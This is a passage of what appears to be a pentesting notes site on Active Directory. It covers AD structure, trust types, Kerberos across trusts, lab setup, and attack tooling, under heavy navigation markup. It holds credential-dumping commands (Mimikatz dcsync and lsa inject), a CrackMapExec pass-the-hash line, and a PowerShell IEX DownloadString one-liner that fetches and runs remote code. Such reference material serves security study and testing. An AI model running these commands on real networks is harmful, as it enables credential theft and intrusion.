    <a href="../../../protocols-and-ports/POP3-110/" title="POP3 110" class="md-nav__link">
      POP3 110
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/PPTP-L2TP-VPN-500,1723/" title="PPTP L2TP VPN 500,1723" class="md-nav__link">
      PPTP L2TP VPN 500,1723
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Portmapper-111/" title="Portmapper 111" class="md-nav__link">
      Portmapper 111
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/RDP-3389/" title="RDP 3389" class="md-nav__link">
      RDP 3389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/RPC-135,445/" title="RPC 135,445" class="md-nav__link">
      RPC 135,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SIP-5060/" title="SIP 5060" class="md-nav__link">
      SIP 5060
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/" title="SMB Samba NetBIOS 135 139,445" class="md-nav__link">
      SMB Samba NetBIOS 135 139,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SMTP-25/" title="SMTP 25" class="md-nav__link">
      SMTP 25
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SNMP-161/" title="SNMP 161" class="md-nav__link">
      SNMP 161
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SQL-Server-1433,1434/" title="SQL Server 1433,1434" class="md-nav__link">
      SQL Server 1433,1434
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SSH-22/" title="SSH 22" class="md-nav__link">
      SSH 22
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SquidProxy-3128/" title="SquidProxy 3128" class="md-nav__link">
      SquidProxy 3128
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/TFTP-69/" title="TFTP 69" class="md-nav__link">
      TFTP 69
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Telnet-23/" title="Telnet 23" class="md-nav__link">
      Telnet 23
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Tor-9001,9030/" title="Tor 9001,9030" class="md-nav__link">
      Tor 9001,9030
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/VNC-5900/" title="VNC 5900" class="md-nav__link">
      VNC 5900
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/WebDev/" title="WebDev" class="md-nav__link">
      WebDev
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/WinRM-5985,5986/" title="WinRM 5985,5986" class="md-nav__link">
      WinRM 5985,5986
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/X11-6000/" title="X11 6000" class="md-nav__link">
      X11 6000
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/rlogin-513/" title="Rlogin 513" class="md-nav__link">
      Rlogin 513
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    Introduction
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#components" class="md-nav__link">
    Components
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ad-trust-types" class="md-nav__link">
    AD Trust Types
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-process-across-trust-boundaries" class="md-nav__link">
    Kerberos Process Across Trust Boundaries
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#setup" class="md-nav__link">
    Setup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detect-firewall-blocking-ad" class="md-nav__link">
    Detect Firewall Blocking AD
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#implementing-least-privilege-model" class="md-nav__link">
    Implementing Least Privilege Model
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-types" class="md-nav__link">
    Attack Types
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scanning" class="md-nav__link">
    Scanning
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crackmapexec" class="md-nav__link">
    CrackMapExec
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldapsearch" class="md-nav__link">
    ldapsearch
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impackets-getaduserspy" class="md-nav__link">
    Impacket’s GetADUsers.py
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-powershell-and-built-ins" class="md-nav__link">
    Using PowerShell and Built-ins
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" class="md-nav__link">
    PowerView
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snapshot-for-offline-analysis" class="md-nav__link">
    Snapshot for Offline Analysis
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    Bloodhound
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sysvol" class="md-nav__link">
    SYSVOL
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#collections" class="md-nav__link">
    Collections
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-patterns" class="md-nav__link">
    Attack Patterns
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dumping-ad-credentials" class="md-nav__link">
    Dumping AD Credentials
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#secretsdump" class="md-nav__link">
    secretsdump
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsdit" class="md-nav__link">
    NTDS.dit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dumping-credentials-on-dc" class="md-nav__link">
    Dumping Credentials on DC
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-hash" class="md-nav__link">
    Pass the Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#over-pass-the-hash-pass-the-key" class="md-nav__link">
    Over Pass the Hash / Pass the Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket" class="md-nav__link">
    Pass the Ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcsyc" class="md-nav__link">
    DCSyc
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nrpc-netlogon" class="md-nav__link">
    NRPC (NetLogon)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kb2871997" class="md-nav__link">
    KB2871997
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#microsoft-windows-ad-kerberos-tickets" class="md-nav__link">
    Microsoft Windows AD Kerberos Tickets
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dump" class="md-nav__link">
    Dump
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="active-directory">Active Directory<a class="headerlink" href="#active-directory" title="Permanent link">&para;</a></h1>
<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>Active Directory enables centralized, secure management of an entire network, which might span a building, a city, or multiple locations throughout the world.</p>
<p><img alt="Active Directory Introduction" src="https://i-technet.sec.s-msft.com/dynimg/IC196825.gif" /></p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10</a>)</p>
</blockquote>
<p>These antiquated AD designs only focused on the:
- Directory information tree
- Delegation model
- Group Policy Objects (GPOs) structure and accounts management</p>
<p>Securing privileged access - Active Directory administrative tier model: <a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material">https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material</a></p>
<h2 id="components">Components<a class="headerlink" href="#components" title="Permanent link">&para;</a></h2>
<p><img alt="Structure" src="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images%5ccc759186.ccf65c10-edb1-4a3a-ad87-38775ee43b8a%28ws.10%29.gif" /></p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10</a>)</p>
</blockquote>
<table>
<thead>
<tr>
<th>Component</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Organizational Units</td>
<td><ul><li>Container object</li><li>Used to arrange other objects</li><li>Easier to locate and manage</li><li>Can delegate the authority to manage</li><li>Can be nested in other organizational units </li></ul></td>
</tr>
<tr>
<td>Domains</td>
<td><ul><li>Container object</li><li>Collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains</li><li>Each domain is an administrative boundary for objects.</li><li>A single domain can span multiple physical locations or sites</li></ul></td>
</tr>
<tr>
<td>Domain Trees</td>
<td><ul><li>Collections of domains that are grouped together in hierarchical structures</li><li>When you add a domain to a tree, it becomes a child of the tree root domain</li><li>The domain to which a child domain is attached is called the parent domain.</li><li>A child domain might in turn have its own child domain.</li><li>The name of a child domain is combined with the name of its parent domain to form its own unique Domain Name System (DNS) name such as Corp.nwtraders.msft.</li><li>.:. a tree has a contiguous namespace.</li></ul></td>
</tr>
<tr>
<td>Forests</td>
<td><ul><li>Instance of Active Directory</li><li>Each forest acts as a top-level container in that it houses all domain containers for that particular Active Directory instance</li><li>A forest can contain one or more domain container objects, all of which share a common logical structure, global catalog, directory schema, and directory configuration, as well as automatic two-way transitive trust relationships.</li><li>The first domain in the forest is called the <code class="codehilite"><span class="n">forest</span> <span class="n">root</span> <span class="k">domain</span></code>.</li><li>The name of that domain refers to the forest, such as Nwtraders.msft.</li><li>By default, information in Active Directory is shared only within the forest.</li><li>.:. the forest is a security boundary for the information that is contained in that instance of Active Directory</li></ul></td>
</tr>
<tr>
<td>Site Objects</td>
<td><ul><li>Leaf and container objects</li><li>Topmost object in the hierarchy of objects that are used to manage and implement Active Directory replication</li><li>Stores the hierarchy of objects that are used by the <code class="codehilite"><span class="n">Knowledge</span> <span class="n">Consistency</span> <span class="n">Checker</span> <span class="p">(</span><span class="n">KCC</span><span class="p">)</span></code> to effect the replication topology</li><li>Some of the objects located in: <code class="codehilite"><span class="n">NTDS</span> <span class="n">Site</span> <span class="n">Settings</span> <span class="n">objects</span></code>, <code class="codehilite"><span class="n">subnet</span> <span class="n">objects</span></code>, <code class="codehilite"><span class="k">connection</span> <span class="n">objects</span></code>, <code class="codehilite"><span class="n">server</span> <span class="n">objects</span></code>, and <code class="codehilite"><span class="n">site</span> <span class="n">objects</span></code> (one site object for each site in the forest)</li><li>Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container</li></ul></td>
</tr>
</tbody>
</table>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10</a>)</p>
</blockquote>
<ul>
<li><strong>Schema</strong> - Defines objects and attributes</li>
<li><strong>Query and index mechanism</strong> - Ability to search and publish objects and properties</li>
<li><strong>Global Catalog</strong> - Contains info about every object in directory</li>
<li><strong>Replication Service</strong> - Distributes information across domain controller</li>
</ul>
<ul>
<li>Kerberos v5 used from Windows Server 2000+</li>
<li>Naming conventions<ul>
<li>User Principal name: <em><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#119;&#105;&#110;&#115;&#97;&#97;&#102;&#109;&#97;&#110;&#64;&#115;&#99;&#114;&#105;&#112;&#116;&#100;&#111;&#116;&#115;&#104;&#46;&#108;&#111;&#99;&#97;&#108;">&#119;&#105;&#110;&#115;&#97;&#97;&#102;&#109;&#97;&#110;&#64;&#115;&#99;&#114;&#105;&#112;&#116;&#100;&#111;&#116;&#115;&#104;&#46;&#108;&#111;&#99;&#97;&#108;</a></em></li>
<li>DN (Distinguished Names) LDAP names: <em>CN=winsaafman,DC=corp,DC=scriptdotsh,DC=local</em><ul>
<li>CN = Common name</li>
<li>OU = Organisational Unit</li>
<li>DC = Domain</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="codehilite"><pre><span></span><span class="nv">powershell</span>.<span class="nv">exe</span> <span class="o">-</span><span class="k">exec</span> <span class="nv">Bypass</span> <span class="o">-</span><span class="nv">C</span> “<span class="nv">IEX</span> <span class="ss">(</span><span class="nv">New</span><span class="o">-</span><span class="nv">Object</span> <span class="nv">Net</span>.<span class="nv">WebClient</span><span class="ss">)</span>.<span class="nv">DownloadString</span><span class="ss">(</span>‘<span class="nv">https</span>:<span class="o">//</span><span class="nv">raw</span>.<span class="nv">githubusercontent</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">PowerShellMafia</span><span class="o">/</span><span class="nv">PowerSploit</span><span class="o">/</span><span class="nv">master</span><span class="o">/</span><span class="nv">Recon</span><span class="o">/</span><span class="nv">PowerView</span>.<span class="nv">ps1</span>’<span class="ss">)</span><span class="c1">;Get-NetDomain”</span>
</pre></div>

<h2 id="ad-trust-types">AD Trust Types<a class="headerlink" href="#ad-trust-types" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Ref:  <a href="https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png">https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png</a></p>
</blockquote>
<p><img alt="" src="../_assets/Trust_types-1200x706.jpg" /></p>
<table>
<thead>
<tr>
<th><strong>Trust Type</strong></th>
<th><strong>Property</strong></th>
<th><strong>Trust</strong> <strong>Direction</strong></th>
<th><strong>Auth.</strong></th>
<th><strong>Details</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Tree-Root</td>
<td>Transitive</td>
<td>Two-way</td>
<td>Kerberos V5 or NTLM</td>
<td>Created automatically when a new Tree is added to a forest.</td>
</tr>
<tr>
<td>Parent-Child</td>
<td>Transitive</td>
<td>Two-way</td>
<td>Kerberos V5 or NTLM</td>
<td>Created automatically when a child domain is added.</td>
</tr>
<tr>
<td>Shortcut</td>
<td>Transitive</td>
<td>One-way or Two-way</td>
<td>Kerberos V5 or NTLM</td>
<td>Created Manually. Used in a forest to shorten the trust path to improve authentication times.</td>
</tr>
<tr>
<td>Forest</td>
<td>Transitive</td>
<td>One-way or Two-way</td>
<td>Kerberos V5 or NTLM</td>
<td>Created Manually. Used to share resources between AD DS forests.</td>
</tr>
</tbody>
</table>
<h2 id="kerberos-process-across-trust-boundaries">Kerberos Process Across Trust Boundaries<a class="headerlink" href="#kerberos-process-across-trust-boundaries" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Ref:  <a href="https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png">https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png</a></p>
</blockquote>
<p><img alt="" src="../_assets/trust_flow.png" /></p>
<p>A client from Domain 1 wants to access the server located in Domain 2.</p>
<ol>
<li>A client from Domain1 requests a TGT from the DC1.</li>
<li>DC1 responds back with the TGT (encrypted with krbtgt hash)</li>
<li>Client shows the TGT and requests a TGS for accessing the server in Domain2.<ul>
<li>As DC1 doesn’t find the server in current domain and realizes that the TGS needs to be issued by the DC2 (of Domain2) because the server is located in the Domain2. So it responds back to client with the Inter-realm TGT.</li>
</ul>
</li>
<li>Client shows the TGT encrypted with Inter-Realm trust key to DC2 in the Domain2 and requests TGS to access the server.</li>
<li>DC2 sends back the TGS for Server encrypted with server’s account hash.</li>
<li>Client presents the TGS (encrypted with server’s account hash) to the server for access.</li>
</ol>
<p><strong>Scope of Authentication</strong></p>
<ul>
<li>Forest-wide authentication -  Users from the outside forest have the same level of access to resources in the local forest as users who belong to the local forest.</li>
<li>Selective authentication - You need to manually assign permissions on each computer in the domain as well as the resources to which you want users in the second forest to have access (by editing ACE (Access control entry)).</li>
</ul>
<h2 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">Install</span><span class="o">-</span><span class="n">windowsfeature</span> <span class="n">AD</span><span class="o">-</span><span class="k">domain</span><span class="o">-</span><span class="n">services</span>
<span class="n">Install</span><span class="o">-</span><span class="n">WindowsFeature</span> <span class="n">RSAT</span><span class="o">-</span><span class="n">ADDS</span>

<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="n">ADDSDeployment</span>
<span class="n">Install</span><span class="o">-</span><span class="n">ADDSForest</span> <span class="o">-</span><span class="n">CreateDnsDelegation</span><span class="p">:</span><span class="err">$</span><span class="k">false</span> <span class="o">`</span> <span class="o">-</span><span class="n">DatabasePath</span> <span class="ss">&quot;C:\Windows\NTDS&quot;</span> <span class="o">`</span> <span class="o">-</span><span class="n">DomainMode</span> <span class="ss">&quot;Win2012R2&quot;</span> <span class="o">`</span> <span class="o">-</span><span class="n">DomainName</span> <span class="ss">&quot;server1.hacklab.local&quot;</span> <span class="o">`</span> <span class="o">-</span><span class="n">DomainNetbiosName</span> <span class="ss">&quot;server1&quot;</span> <span class="o">`</span>  <span class="o">-</span><span class="n">ForestMode</span> <span class="ss">&quot;Win2012R2&quot;</span> <span class="o">`</span>  <span class="o">-</span><span class="n">InstallDns</span><span class="p">:</span><span class="err">$</span><span class="k">true</span> <span class="o">`</span>  <span class="o">-</span><span class="n">LogPath</span> <span class="ss">&quot;C:\Windows\NTDS&quot;</span> <span class="o">`</span>  <span class="o">-</span><span class="n">NoRebootOnCompletion</span><span class="p">:</span><span class="err">$</span><span class="k">false</span> <span class="o">`</span>  <span class="o">-</span><span class="n">SysvolPath</span> <span class="ss">&quot;C:\Windows\SYSVOL&quot;</span> <span class="o">`</span>  <span class="o">-</span><span class="k">Force</span><span class="p">:</span><span class="err">$</span><span class="k">true</span>
</pre></div>

<ul>
<li>Download VMs: <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li>
<li>SysPrep When and How: <a href="https://thesolving.com/server-room/when-and-how-to-use-sysprep/">https://thesolving.com/server-room/when-and-how-to-use-sysprep/</a></li>
<li>Add user<ul>
<li><code class="codehilite"><span class="n">net</span> <span class="k">user</span> <span class="n">user1</span> <span class="n">Passw0rd</span><span class="o">!</span> <span class="o">/</span><span class="k">ADD</span> <span class="o">/</span><span class="k">DOMAIN</span></code></li>
<li><code class="codehilite"><span class="k">New</span><span class="o">-</span><span class="n">ADUser</span><span class="w"> </span><span class="o">-</span><span class="n">Name</span><span class="w"> </span><span class="ss">&quot;Winsaaf Man&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">DisplayName</span><span class="w"> </span><span class="ss">&quot;Winsaaf Man&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">SamAccountName</span><span class="w"> </span><span class="err">“</span><span class="n">winsaaf</span><span class="p">.</span><span class="n">man</span><span class="err">”</span><span class="w"> </span><span class="o">-</span><span class="n">UserPrincipalName</span><span class="w"> </span><span class="err">“</span><span class="n">winsaaf</span><span class="p">.</span><span class="n">man</span><span class="nv">@scriptdotsh</span><span class="p">.</span><span class="k">local</span><span class="err">”</span><span class="w"> </span><span class="o">-</span><span class="n">GivenName</span><span class="w"> </span><span class="err">“</span><span class="n">winsaaf</span><span class="err">”</span><span class="w"> </span><span class="o">-</span><span class="n">Surname</span><span class="w"> </span><span class="ss">&quot;man&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">AccountPassword</span><span class="w"> </span><span class="p">(</span><span class="k">Read</span><span class="o">-</span><span class="k">host</span><span class="w"> </span><span class="o">-</span><span class="n">AsSecureString</span><span class="w"> </span><span class="err">“</span><span class="n">Enter</span><span class="w"> </span><span class="n">Password</span><span class="err">”</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="n">Enabled</span><span class="w"> </span><span class="err">$</span><span class="k">true</span><span class="w"> </span><span class="o">-</span><span class="n">server</span><span class="w"> </span><span class="n">scriptdotsh</span><span class="p">.</span><span class="k">local</span><span class="w"></span></code><ul>
<li>More options:<ul>
<li><code class="codehilite"><span class="o">-</span><span class="n">ChangePasswordAtLogon</span> <span class="err">$</span><span class="k">false</span></code></li>
<li><code class="codehilite"><span class="o">-</span><span class="n">PasswordNeverExpires</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Bulk addition: <a href="https://gallery.technet.microsoft.com/office/Create-Contoso-Users-in-3e2f38f2/view/Discussions">https://gallery.technet.microsoft.com/office/Create-Contoso-Users-in-3e2f38f2/view/Discussions</a></li>
</ul>
</li>
<li>View users: <code class="codehilite"><span class="n">net</span> <span class="n">users</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>View group: <code class="codehilite"><span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span> <span class="ss">&quot;Domain Admins&quot;</span></code></li>
</ul>
<h2 id="detect-firewall-blocking-ad">Detect Firewall Blocking AD<a class="headerlink" href="#detect-firewall-blocking-ad" title="Permanent link">&para;</a></h2>
<p>PortQryUI - <a href="http://www.microsoft.com/download/en/details.aspx?id=24009">http://www.microsoft.com/download/en/details.aspx?id=24009</a>
* Run the “Domains &amp; Trusts” option between DCs, or between DCs and any machine
* “NOTLISTENING,” 0x00000001, and 0x00000002, that means there is a port block
* Can ignore UDP 389 and UDP 88 messages
* TCP 42 errors, that just means WINS is not running on the target server</p>
<blockquote>
<p><a href="https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/">https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/</a></p>
</blockquote>
<h2 id="implementing-least-privilege-model">Implementing Least Privilege Model<a class="headerlink" href="#implementing-least-privilege-model" title="Permanent link">&para;</a></h2>
<p><a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models">https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models</a></p>
<h2 id="attack-types">Attack Types<a class="headerlink" href="#attack-types" title="Permanent link">&para;</a></h2>
<ul>
<li>Windows systems vulnerabilities.</li>
<li>AD misconfigurations.</li>
</ul>
<h2 id="scanning">Scanning<a class="headerlink" href="#scanning" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">pingcastle</span><span class="p">.</span><span class="n">exe</span> <span class="c1">--healthcheck --server &lt;DOMAIN_CONTROLLER_IP&gt; --user &lt;USERNAME&gt; --password &lt;PASSWORD&gt; --advanced-live --nullsession</span>
</pre></div>

<ul>
<li>Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): <a href="https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be">https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be</a></li>
</ul>
<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
<h3 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h3>
<p>utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file
<div class="codehilite"><pre><span></span><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="o">/</span><span class="k">domain</span><span class="p">:</span><span class="n">pentestlab</span><span class="p">.</span><span class="k">local</span> <span class="o">/</span><span class="k">all</span> <span class="o">/</span><span class="n">csv</span>
<span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="o">/</span><span class="k">domain</span><span class="p">:</span><span class="n">pentestlab</span><span class="p">.</span><span class="k">local</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">test</span>
</pre></div></p>
<p>executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process
<div class="codehilite"><pre><span></span><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">inject</span>
</pre></div></p>
<h3 id="crackmapexec">CrackMapExec<a class="headerlink" href="#crackmapexec" title="Permanent link">&para;</a></h3>
<p>Automate assessing the security of large Active Directory networks
<div class="codehilite"><pre><span></span><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="o">&lt;</span><span class="n">target</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">u</span> <span class="n">username</span> <span class="o">-</span><span class="n">H</span> <span class="n">LMHASH</span><span class="p">:</span><span class="n">NTHASH</span>
<span class="n">crackmapexec</span> <span class="n">smb</span> <span class="o">&lt;</span><span class="n">target</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">u</span> <span class="n">username</span> <span class="o">-</span><span class="n">H</span> <span class="n">NTHASH</span>
</pre></div></p>
<h3 id="ldapsearch">ldapsearch<a class="headerlink" href="#ldapsearch" title="Permanent link">&para;</a></h3>
<ul>
<li>Query the Domain Controller for Active Directory<ul>
<li>UserAccountControl attributes of active accounts</li>
<li>Other specific configurations</li>
</ul>
</li>
<li>Possible UserAccountControl values: <a href="https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro">https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro</a></li>
</ul>
<p>Active users (2 == disabled account status)
<div class="codehilite"><pre><span></span><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">h</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="o">-</span><span class="n">D</span> <span class="s1">&#39;SVC_TGS&#39;</span><span class="err">​</span> <span class="o">-</span><span class="n">w</span> <span class="err">​$</span><span class="n">password</span> <span class="o">-</span><span class="n">b</span> <span class="err">​</span> <span class="ss">&quot;dc=active,dc=htb&quot;</span><span class="err">​</span> <span class="o">-</span><span class="n">s</span> <span class="n">sub</span> <span class="ss">&quot;(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))&quot;</span><span class="err">​</span> <span class="n">samaccountname</span>
</pre></div></p>
<h3 id="impackets-getaduserspy">Impacket’s GetADUsers.py<a class="headerlink" href="#impackets-getaduserspy" title="Permanent link">&para;</a></h3>
<ul>
<li>Enumerate domain user accounts</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">GetADUsers</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="k">all</span> <span class="n">active</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">svc_tgs</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="err">$</span><span class="n">ip</span>
</pre></div>

<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
<h3 id="using-powershell-and-built-ins">Using PowerShell and Built-ins<a class="headerlink" href="#using-powershell-and-built-ins" title="Permanent link">&para;</a></h3>
<p>Works in <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">Constrained Mode</a> as well.</p>
<div class="codehilite"><pre><span></span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="err">\</span><span class="n">assembly</span><span class="err">\</span><span class="n">GAC_64</span><span class="err">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="err">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
</pre></div>

<blockquote>
